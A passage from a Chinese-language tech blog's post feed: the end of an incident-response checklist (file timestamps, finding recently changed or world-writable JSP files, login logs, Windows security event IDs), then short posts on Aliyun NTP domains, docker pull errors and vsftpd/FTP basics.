class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br></code></pre></td></tr></table></figure><p>web下载文件到设备，会修改文件的access和change时间，change时间会修改为落盘时间</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs subunit">2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33 wget 下载<br><br>(base) [root@aliyun<span class="hljs-string">-1</span>_1_1_1 tmp]# wget http://xx.xx.xx.xx:1234/11.txt<br>-<span class="hljs-string">-2024</span><span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33--  http://xx.xx.xx.xx:1234/11.txt<br>正在连接 xx.xx.xx.xx:1234... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：2 [text/plain]<br>正在保存至: “11.txt”<br><br>100%[==============================================================================================================&gt;] 2           --.-K/s 用时 0s<br><br>2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33 (279 KB/s) - 已保存 “11.txt” [2/2])<br><br>(base) [root@aliyun<span class="hljs-string">-1</span>_1_1_1 tmp]# stat 11.txt<br>  文件：&quot;11.txt&quot;<br>  大小：2         块：8          IO 块：4096   普通文件<br>设备：fd01h/64769dInode：925677      硬链接：1<br>权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)<br>最近访问：2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33.000000000 <span class="hljs-string">+0800</span><br>最近更改：2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:07:33.000000000 <span class="hljs-string">+0800</span><br>最近改动：2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33.231719265 <span class="hljs-string">+0800</span><br>创建时间：-<br></code></pre></td></tr></table></figure><h4 id="排查tmp目录"><a href="#排查tmp目录" class="headerlink" title="排查tmp目录"></a>排查tmp目录</h4><p>任意用户可操作的目录，排查是否存在可疑文件</p><p>&#x2F;tmp&#x2F;</p><p>&#x2F;var&#x2F;tmp&#x2F;</p><h4 id="排查近期改动文件"><a href="#排查近期改动文件" class="headerlink" title="排查近期改动文件"></a>排查近期改动文件</h4><h5 id="24小时内被改动文件查找-全局查找"><a href="#24小时内被改动文件查找-全局查找" class="headerlink" title="24小时内被改动文件查找(全局查找)"></a>24小时内被改动文件查找(全局查找)</h5><p>查找24小时内修改过的jsp文件</p><p>find &#x2F; -mtime 0 -name “*.jsp”</p><h5 id="72小时内被新增文件查找-全局查找"><a href="#72小时内被新增文件查找-全局查找" class="headerlink" title="72小时内被新增文件查找(全局查找)"></a>72小时内被新增文件查找(全局查找)</h5><p>查找72小时内新增的文件</p><p>find &#x2F; -ctime 2 -name “*.*“</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-comment"># find / -ctime -2 -name &quot;*.*&quot;</span><br><span class="hljs-regexp">/run/systemd</span><span class="hljs-regexp">/sessions/</span><span class="hljs-number">10143</span>.ref<br><span class="hljs-regexp">/run/systemd</span><span class="hljs-regexp">/sessions/</span><span class="hljs-number">10142</span>.ref<br><span class="hljs-regexp">/run/systemd</span><span class="hljs-regexp">/system/session</span>-<span class="hljs-number">10143</span>.scope.d<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/audit/audit</span>.log<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log-<span class="hljs-number">20220824</span><br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log-<span class="hljs-number">20220823</span>.gz<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log-<span class="hljs-number">20220822</span>.gz<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log-<span class="hljs-number">20220822</span>.gz<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log-<span class="hljs-number">20220824</span><br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log-<span class="hljs-number">20220823</span>.gz<br></code></pre></td></tr></table></figure><h4 id="排查高权限文件"><a href="#排查高权限文件" class="headerlink" title="排查高权限文件"></a>排查高权限文件</h4><h5 id="777权限文件查找"><a href="#777权限文件查找" class="headerlink" title="777权限文件查找"></a>777权限文件查找</h5><p>find &#x2F; -iname “*.jsp” -perm 777</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-regexp">/]# find /</span> <span class="hljs-operator">-</span>iname <span class="hljs-string">&quot;*.jsp&quot;</span> <span class="hljs-operator">-</span>perm <span class="hljs-number">777</span><br><span class="hljs-regexp">/tmp/</span><span class="hljs-number">1</span>.jsp<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-regexp">/]# ls -lat /</span>tmp<span class="hljs-operator">/</span><span class="hljs-number">1</span>.jsp<br><span class="hljs-operator">-</span>rwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">5</span> <span class="hljs-number">8</span>月  <span class="hljs-number">24</span> <span class="hljs-number">21</span>:<span class="hljs-number">09</span> <span class="hljs-regexp">/tmp/</span><span class="hljs-number">1</span>.jsp<br></code></pre></td></tr></table></figure><h3 id="排查相关日志"><a href="#排查相关日志" class="headerlink" title="排查相关日志"></a>排查相关日志</h3><h4 id="Linux日志"><a href="#Linux日志" class="headerlink" title="Linux日志"></a>Linux日志</h4><h5 id="排查思路"><a href="#排查思路" class="headerlink" title="排查思路"></a>排查思路</h5><p>Q：</p><h5 id="具体日志"><a href="#具体日志" class="headerlink" title="具体日志"></a>具体日志</h5><h6 id="历史操作命令history"><a href="#历史操作命令history" class="headerlink" title="历史操作命令history"></a>历史操作命令history</h6><p>读取 ~&#x2F;.bash_history ，默认输出格式为：num command</p><p>默认保存1000条</p><p>.bash_history文件权限600，每个用户独有一份</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># ls -lat ~/.bash_history</span><br>-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3738 </span>8月  <span class="hljs-number"> 7 </span>19:13 /root/.bash_history<br></code></pre></td></tr></table></figure><p>正常情况下是退出bash后会将历史命令信息保存在.bash_history文件中</p><h6 id="root-bash-history"><a href="#root-bash-history" class="headerlink" title="&#x2F;root&#x2F;.bash_history"></a>&#x2F;root&#x2F;.bash_history</h6><p>root 用户 history -w 写入的 history 记录文件</p><h6 id="var-spool-mail-root"><a href="#var-spool-mail-root" class="headerlink" title="&#x2F;var&#x2F;spool&#x2F;mail&#x2F;root"></a>&#x2F;var&#x2F;spool&#x2F;mail&#x2F;root</h6><h6 id="var-log-wtmp"><a href="#var-log-wtmp" class="headerlink" title="&#x2F;var&#x2F;log&#x2F;wtmp"></a>&#x2F;var&#x2F;log&#x2F;wtmp</h6><h6 id="检查系统用户登录日志"><a href="#检查系统用户登录日志" class="headerlink" title="检查系统用户登录日志"></a>检查系统用户登录日志</h6><p>日志路径：&#x2F;var&#x2F;log&#x2F;secure</p><h6 id="检查密码登录成功记录"><a href="#检查密码登录成功记录" class="headerlink" title="检查密码登录成功记录"></a>检查密码登录成功记录</h6><p>查看登录成功记录的来源IP判断入侵来源，可以将来源IP进行威胁情报检测，查看IP状态</p><p>cat secure* | grep “Accepted password”</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@aliyun</span><span class="hljs-number">-1</span>_1_1_1 <span class="hljs-built_in">log</span>]<span class="hljs-meta"># cat secure* | grep <span class="hljs-string">&quot;Accepted password&quot;</span></span><br>Mar <span class="hljs-number">29</span> <span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">08</span> aliyun<span class="hljs-number">-1</span>_1_1_1 sshd[<span class="hljs-number">14458</span>]: Accepted password <span class="hljs-keyword">for</span> root from <span class="hljs-number">8.3</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span> port <span class="hljs-number">16045</span> ssh2<br></code></pre></td></tr></table></figure><h4 id="Windows日志"><a href="#Windows日志" class="headerlink" title="Windows日志"></a>Windows日志</h4><p>基于Windows11专业版</p><p>运行输入 eventvwr.msc 命令&#x2F;直接搜索“事件查看器”打开事件查看器</p><h5 id="排查思路-1"><a href="#排查思路-1" class="headerlink" title="排查思路"></a>排查思路</h5><h6 id="检查是否存在爆破"><a href="#检查是否存在爆破" class="headerlink" title="检查是否存在爆破"></a>检查是否存在爆破</h6><p>4624 账户登录成功日志</p><p>4625 账户登录失败日志</p><h6 id="检查是否存在权限维持"><a href="#检查是否存在权限维持" class="headerlink" title="检查是否存在权限维持"></a>检查是否存在权限维持</h6><p>4720 新增账户日志</p><p>4726 删除账户日志</p><p>4724 账户密码重置</p><p>7045 系统日志-服务安装</p><p>4719 更改审核&#x2F;审计策略日志</p><h6 id="检查是否存在权限提升"><a href="#检查是否存在权限提升" class="headerlink" title="检查是否存在权限提升"></a>检查是否存在权限提升</h6><p>4732 账户权限变更</p><p>4672 账户登录分配特殊权限</p><h6 id="检查是否存在日志删除等痕迹消除"><a href="#检查是否存在日志删除等痕迹消除" class="headerlink" title="检查是否存在日志删除等痕迹消除"></a>检查是否存在日志删除等痕迹消除</h6><p>1102 日志删除日志</p><h5 id="安全日志"><a href="#安全日志" class="headerlink" title="安全日志"></a>安全日志</h5><h6 id="4624-账户登录成功日志"><a href="#4624-账户登录成功日志" class="headerlink" title="4624 账户登录成功日志"></a>4624 账户登录成功日志</h6><p><img src="/image-20241125140024535.png" alt="image-20241125140024535"></p><h6 id="4625-账户登录失败日志"><a href="#4625-账户登录失败日志" class="headerlink" title="4625 账户登录失败日志"></a>4625 账户登录失败日志</h6><p><img src="/image-20241125135958626.png" alt="image-20241125135958626"></p><h6 id="4720-新增账户日志"><a href="#4720-新增账户日志" class="headerlink" title="4720 新增账户日志"></a>4720 新增账户日志</h6><p><img src="/image-20241125140454155.png" alt="image-20241125140454155"></p><h6 id="4726-删除账户日志"><a href="#4726-删除账户日志" class="headerlink" title="4726 删除账户日志"></a>4726 删除账户日志</h6><p><img src="/image-20241125141610204.png" alt="image-20241125141610204"></p><h6 id="4732-账户权限变更"><a href="#4732-账户权限变更" class="headerlink" title="4732 账户权限变更"></a>4732 账户权限变更</h6><p>加入对应组</p><p><img src="/image-20241125140712767.png" alt="image-20241125140712767"></p><h6 id="4672-账户登录分配特殊权限"><a href="#4672-账户登录分配特殊权限" class="headerlink" title="4672 账户登录分配特殊权限"></a>4672 账户登录分配特殊权限</h6><p><img src="/image-20241125141403152.png" alt="image-20241125141403152"></p><h6 id="4724-账户密码重置"><a href="#4724-账户密码重置" class="headerlink" title="4724 账户密码重置"></a>4724 账户密码重置</h6><p><img src="/image-20241125141016730.png" alt="image-20241125141016730"></p><h6 id="4719-更改审核-审计策略日志"><a href="#4719-更改审核-审计策略日志" class="headerlink" title="4719 更改审核&#x2F;审计策略日志"></a>4719 更改审核&#x2F;审计策略日志</h6><p><img src="/image-20241125144203503.png" alt="image-20241125144203503"></p><h6 id="1102-日志删除日志"><a href="#1102-日志删除日志" class="headerlink" title="1102 日志删除日志"></a>1102 日志删除日志</h6><p><img src="/image-20241125165212144.png" alt="image-20241125165212144"></p><h5 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h5><h6 id="7045-服务安装日志"><a href="#7045-服务安装日志" class="headerlink" title="7045 服务安装日志"></a>7045 服务安装日志</h6><p><img src="/image-20241125142037647.png" alt="image-20241125142037647"></p><h3 id="命令替换工具busybox"><a href="#命令替换工具busybox" class="headerlink" title="命令替换工具busybox"></a>命令替换工具busybox</h3><p><a href="https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox">https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netSec</category>
      
      <category>secresponse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netSec</tag>
      
      <tag>secresponse</tag>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ntp_domain</title>
    <link href="/2024/03/08/yunwei/applications/ntp/ntp_domain/"/>
    <url>/2024/03/08/yunwei/applications/ntp/ntp_domain/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="常见ntp服务域名"><a href="#常见ntp服务域名" class="headerlink" title="常见ntp服务域名"></a>常见ntp服务域名</h1><h2 id="阿里云"><a href="#阿里云" class="headerlink" title="阿里云"></a>阿里云</h2><h1 id=""><a href="#" class="headerlink" title=""></a></h1><table><thead><tr><th align="left">经典网络内网</th><th align="left">专有网络VPC内网</th><th align="left">公网</th></tr></thead><tbody><tr><td align="left">-</td><td align="left">ntp.cloud.aliyuncs.com</td><td align="left">ntp.aliyun.com</td></tr><tr><td align="left">ntp1.cloud.aliyuncs.com</td><td align="left">ntp7.cloud.aliyuncs.com</td><td align="left">ntp1.aliyun.com</td></tr><tr><td align="left">ntp2.cloud.aliyuncs.com</td><td align="left">ntp8.cloud.aliyuncs.com</td><td align="left">ntp2.aliyun.com</td></tr><tr><td align="left">ntp3.cloud.aliyuncs.com</td><td align="left">ntp9.cloud.aliyuncs.com</td><td align="left">ntp3.aliyun.com</td></tr><tr><td align="left">ntp4.cloud.aliyuncs.com</td><td align="left">ntp10.cloud.aliyuncs.com</td><td align="left">ntp4.aliyun.com</td></tr><tr><td align="left">ntp5.cloud.aliyuncs.com</td><td align="left">ntp11.cloud.aliyuncs.com</td><td align="left">ntp5.aliyun.com</td></tr><tr><td align="left">ntp6.cloud.aliyuncs.com</td><td align="left">ntp12.cloud.aliyuncs.com</td><td align="left">ntp6.aliyun.com</td></tr><tr><td align="left">-</td><td align="left">-</td><td align="left">ntp7.aliyun.com</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>ntp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>ntp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_error</title>
    <link href="/2024/03/07/yunwei/applications/docker/docker_error/"/>
    <url>/2024/03/07/yunwei/applications/docker/docker_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="docker-pull-error"><a href="#docker-pull-error" class="headerlink" title="docker pull error"></a>docker pull error</h1><h2 id="image-name-error"><a href="#image-name-error" class="headerlink" title="image name error"></a>image name error</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(base) root@localhost:~# docker pull gitlab-ce/gitlab-ce:14.9.1<br><span class="hljs-keyword">Error </span>response from daemon: pull access denied for gitlab-ce/gitlab-ce, repository does not exist or may require &#x27;docker login&#x27;: denied: requested access to the resource is denied<br></code></pre></td></tr></table></figure><p>因为镜像名称写错导致报错，正确镜像名称gitlab&#x2F;gitlab-ce</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">(base) root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># docker search gitlab-ce</span><br><span class="hljs-title class_">NAME</span>                                     <span class="hljs-title class_">DESCRIPTION</span>                                     <span class="hljs-title class_">STARS</span>     <span class="hljs-title class_">OFFICIAL</span>   <span class="hljs-title class_">AUTOMATED</span><br>gitlab/gitlab-ce                         <span class="hljs-title class_">GitLab</span> <span class="hljs-title class_">Community</span> <span class="hljs-title class_">Edition</span> docker image based …   <span class="hljs-number">3592</span>                 [<span class="hljs-title class_">OK</span>]<br><br></code></pre></td></tr></table></figure><h2 id="image-tag-error"><a href="#image-tag-error" class="headerlink" title="image tag error"></a>image tag error</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(base) root@localhost:~# docker pull gitlab/gitlab-ce:14.9.1<br><span class="hljs-keyword">Error </span>response from daemon: manifest for gitlab/gitlab-ce:14.9.1 not found: manifest unknown: manifest unknown<br><br></code></pre></td></tr></table></figure><p>因为镜像版本号不对导致报错，需要正确版本号</p><p>如何确认正常版本号</p><p>登录docker hub <a href="https://hub.docker.com/u/library">https://hub.docker.com/u/library</a> 搜索对应的镜像</p><p>复制提供的命令即可正确下载</p><p><a href="https://blog.csdn.net/ichen820/article/details/114536044">https://blog.csdn.net/ichen820/article/details/114536044</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweiapplications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweiapplications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ftp_base</title>
    <link href="/2024/03/04/yunwei/applications/ftp/ftp_base/"/>
    <url>/2024/03/04/yunwei/applications/ftp/ftp_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h1><p>FTP（File Transfer Protocol）文件传输协议，用于在网络上进行文件传输的协议</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h2><p>Linux下常用的ftp工具为vsftp</p><h3 id="检查是否安装"><a href="#检查是否安装" class="headerlink" title="检查是否安装"></a><strong>检查是否安装</strong></h3><p>rpm -qa | grep vsftpd</p><h3 id="yum安装"><a href="#yum安装" class="headerlink" title="yum安装"></a><strong>yum安装</strong></h3><p>yum install vsftpd -y</p><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a><strong>操作</strong></h1><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a><strong>启动</strong></h2><p>service vsftpd start</p><p>systemctl start vsftpd</p><h2 id="停止"><a href="#停止" class="headerlink" title="停止"></a><strong>停止</strong></h2><p>service vsftpd stop</p><p>systemctl stop vsftpd</p><h2 id="状态"><a href="#状态" class="headerlink" title="状态"></a><strong>状态</strong></h2><p>service vsftpd status</p><p>systemctl status vsftpd</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dts">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-meta"># service vsftpd status</span><br>Redirecting to <span class="hljs-keyword">/bin/</span>systemctl status vsftpd.service<br>● vsftpd.service - Vsftpd ftp daemon<br><span class="hljs-symbol">   Loaded:</span> loaded (<span class="hljs-keyword">/usr/</span>lib<span class="hljs-keyword">/systemd/</span>system/vsftpd.<span class="hljs-attr">service</span><span class="hljs-punctuation">;</span> <span class="hljs-attr">disabled</span><span class="hljs-punctuation">;</span> vendor preset: disabled)<br><span class="hljs-symbol">   Active:</span> inactive (dead)<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-meta"># systemctl status vsftpd</span><br>● vsftpd.service - Vsftpd ftp daemon<br><span class="hljs-symbol">   Loaded:</span> loaded (<span class="hljs-keyword">/usr/</span>lib<span class="hljs-keyword">/systemd/</span>system/vsftpd.<span class="hljs-attr">service</span><span class="hljs-punctuation">;</span> <span class="hljs-attr">disabled</span><span class="hljs-punctuation">;</span> vendor preset: disabled)<br><span class="hljs-symbol">   Active:</span> inactive (dead)<br></code></pre></td></tr></table></figure><h1 id="默认信息"><a href="#默认信息" class="headerlink" title="默认信息"></a><strong>默认信息</strong></h1><h2 id="默认可执行文件"><a href="#默认可执行文件" class="headerlink" title="默认可执行文件"></a><strong>默认可执行文件</strong></h2><p>&#x2F;usr&#x2F;sbin&#x2F;vsftpd</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lat <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/vsftpd -rwxr-xr-x 1 root root 175440 6月  10 2021 /</span>usr<span class="hljs-regexp">/sbin/</span>vsftpd<br></code></pre></td></tr></table></figure><h2 id="默认安装配置目录"><a href="#默认安装配置目录" class="headerlink" title="默认安装配置目录"></a><strong>默认安装配置目录</strong></h2><p>&#x2F;etc&#x2F;vsftpd&#x2F;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp1191gh7vw52537lyxrZ ~]# <span class="hljs-built_in">ls</span> -ld /etc/vsftpd/ drwxr-xr-x 2 root root 4096 4月   3 19:52 /etc/vsftpd/<br></code></pre></td></tr></table></figure><h2 id="默认核心配置文件"><a href="#默认核心配置文件" class="headerlink" title="默认核心配置文件"></a><strong>默认核心配置文件</strong></h2><p>&#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lat <span class="hljs-regexp">/etc/</span>vsftpd<span class="hljs-regexp">/vsftpd.conf -rw------- 1 root root 5116 6月  10 2021 /</span>etc<span class="hljs-regexp">/vsftpd/</span>vsftpd.conf<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">anonymous_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">local_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">write_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">local_umask</span>=<span class="hljs-number">022</span><br><span class="hljs-attr">dirmessage_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">xferlog_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">connect_from_port_20</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">xferlog_std_format</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">listen</span>=<span class="hljs-literal">NO</span><br><span class="hljs-attr">listen_ipv6</span>=<span class="hljs-literal">YES</span><br><br><span class="hljs-attr">pam_service_name</span>=vsftpd<br><span class="hljs-attr">userlist_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">tcp_wrappers</span>=<span class="hljs-literal">YES</span><br></code></pre></td></tr></table></figure><h3 id="配置说明"><a href="#配置说明" class="headerlink" title="配置说明"></a><strong>配置说明</strong></h3><p>anonymous_enable&#x3D;YES # 允许匿名登录</p><p>local_enable&#x3D;YES # 允许本地用户登录</p><p>write_enable&#x3D;YES # 允许写操作</p><p>local_umask&#x3D;022 # 新增文件权限，默认022</p><h2 id="默认日志"><a href="#默认日志" class="headerlink" title="默认日志"></a><strong>默认日志</strong></h2><p>yum 安装默认没有开启日志功能，需要额外配置</p><p>常见日志路径&#x2F;var&#x2F;log&#x2F;vsftpd.log</p><p>日志开启配置</p><h1 id="ftp远程连接"><a href="#ftp远程连接" class="headerlink" title="ftp远程连接"></a><strong>ftp远程连接</strong></h1><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a><strong>Linux</strong></h2><h3 id="ftp命令"><a href="#ftp命令" class="headerlink" title="ftp命令"></a><strong>ftp命令</strong></h3><p>命令安装</p><p>yum install ftp -y</p><p>连接</p><p>ftp ftp.example.com</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">(base) [root@aliyun ~]<span class="hljs-comment"># ftp 1.1.1.1 Connected to 1.1.1.1 (1.1.1.1). 220  ftp ready. Name (1.1.1.16:root): anonymous 331 Username ok, send password. Password: 530 Authentication failed.id: 003</span><br></code></pre></td></tr></table></figure><p>如果支持匿名访问，用户名可以输入<strong>anonymous</strong>，密码为<strong>邮件地址</strong>或者<strong>空</strong></p><h3 id="lftp命令"><a href="#lftp命令" class="headerlink" title="lftp命令"></a><strong>lftp命令</strong></h3><h4 id="命令安装"><a href="#命令安装" class="headerlink" title="命令安装"></a><strong>命令安装</strong></h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> lftp -y<br></code></pre></td></tr></table></figure><h4 id="连接默认端口"><a href="#连接默认端口" class="headerlink" title="连接默认端口"></a><strong>连接默认端口</strong></h4><p>lftp <a href="ftp://ftp.example.com/">ftp://ftp.example.com</a></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">(<span class="hljs-keyword">base</span>) [root<span class="hljs-meta">@aliyun</span> ~]# lftp ftp:<span class="hljs-comment">//1.1.1.1 lftp 1.1.1.1:~&gt; ls</span><br></code></pre></td></tr></table></figure><h4 id="连接指定端口"><a href="#连接指定端口" class="headerlink" title="连接指定端口"></a><strong>连接指定端口</strong></h4><p>lftp <a href="ftp://ftp.example.com:port">ftp://ftp.example.com:port</a></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@nvm</span> /]# lftp ftp://<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>:<span class="hljs-number">2121</span> lftp <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>:~&gt; ls drwxr-xr-<span class="hljs-keyword">x</span>    <span class="hljs-number">2</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> Aug <span class="hljs-number">06</span>  <span class="hljs-number">2019</span> pub drwxr-xrwx    <span class="hljs-number">4</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> Nov <span class="hljs-number">11</span>  <span class="hljs-number">2020</span> report drwxr-xr-<span class="hljs-keyword">x</span>    <span class="hljs-number">2</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> May <span class="hljs-number">24</span>  <span class="hljs-number">2021</span> test drwxr-xr-<span class="hljs-keyword">x</span>    <span class="hljs-number">3</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>           <span class="hljs-number">12288</span> Mar <span class="hljs-number">12</span>  <span class="hljs-number">2023</span> tmp drwxr-xrwx   <span class="hljs-number">27</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>           <span class="hljs-number">12288</span> Jul <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">56</span> upload<br></code></pre></td></tr></table></figure><h1 id="ftp操作命令"><a href="#ftp操作命令" class="headerlink" title="ftp操作命令"></a><strong>ftp操作命令</strong></h1><h2 id="ls-dir"><a href="#ls-dir" class="headerlink" title="ls&#x2F;dir"></a><strong>ls&#x2F;dir</strong></h2><p>列出当前路径下文件及文件夹</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@nvm /]<span class="hljs-comment"># lftp ftp://1.1.1.1:2121</span><br>lftp 1.1.1.1:~&gt; 